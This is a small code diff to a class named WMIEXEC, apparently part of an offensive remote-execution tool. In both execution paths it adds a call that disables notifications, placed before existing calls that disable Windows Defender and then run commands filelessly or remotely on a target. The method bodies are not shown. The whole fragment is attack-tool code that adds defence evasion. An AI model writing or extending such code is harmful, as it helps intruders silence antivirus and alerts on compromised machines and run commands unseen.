@@ -96,6 +96,7 @@ class WMIEXEC:
 
     def execute_handler(self, data):
         if self.__retOutput:
+            self.disable_notifications()
             self.disable_defender()
             try:
                 self.execute_fileless(data)
@@ -103,6 +104,7 @@ class WMIEXEC:
                 self.cd('\\')
                 self.execute_remote(data)
         else:
+            self.disable_notifications()
             self.disable_defender()
             self.execute_remote(data)
 
